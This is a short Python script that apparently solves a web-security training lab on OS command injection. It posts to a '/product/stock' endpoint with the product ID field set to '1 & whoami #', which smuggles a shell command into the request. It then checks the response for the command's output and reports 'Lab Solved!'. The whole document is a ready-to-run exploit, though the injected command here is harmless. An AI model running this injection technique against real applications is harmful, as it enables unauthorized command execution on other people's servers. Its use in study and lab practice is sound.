import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import random
import string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit(url:str):
    data = {'productId': '1 & whoami #', 'storeId': '1'}
    try: 
        r = requests.post(url + '/product/stock', data=data, proxies=proxies, verify=False)
        if r.status_code == 200 and 'peter' in r.text:
            print(f"whoami executed: {r.text}")
            return True
        else:
            print("Failed to execute whoami")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)

    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    if exploit(url):
        print("Lab Solved!")
        sys.exit(0)
    else:
        sys.exit(-1)
if __name__ == '__main__':
    main()